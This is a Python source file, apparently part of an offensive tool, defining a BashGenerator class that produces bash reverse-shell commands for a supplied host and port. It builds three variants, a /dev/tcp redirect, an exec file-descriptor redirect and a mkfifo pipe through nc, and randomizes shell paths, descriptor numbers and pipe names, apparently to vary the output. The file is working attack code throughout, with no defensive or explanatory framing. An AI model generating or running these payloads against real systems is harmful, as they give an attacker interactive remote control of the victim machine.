import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_BASH_PATHS = ["/bin/bash", "/bin/sh"]
_VARIANTS = ["dev_tcp", "exec_redirect", "mkfifo"]


class BashGenerator(ShellGenerator):
    language = "bash"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        shell = random.choice(_BASH_PATHS) if names else "/bin/bash"

        if variant == "dev_tcp":
            cmd = self._dev_tcp(lhost, lport, shell, names)
        elif variant == "exec_redirect":
            cmd = self._exec_redirect(lhost, lport, shell, names)
        else:
            cmd = self._mkfifo(lhost, lport, shell, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _dev_tcp(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
        return f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    def _exec_redirect(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
        fd = random.choice([5, 3, 4, 6]) if names else 5
        return (
            f"exec {fd}<>/dev/tcp/{lhost}/{lport};"
            f"{shell} <&{fd} >&{fd} 2>&{fd}"
        )

    def _mkfifo(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
        pipe = self._var("f", names)
        return (
            f"rm -f /tmp/{pipe}; mkfifo /tmp/{pipe}; "
            f"cat /tmp/{pipe} | {shell} -i 2>&1 | nc {lhost} {lport} > /tmp/{pipe}"
        )
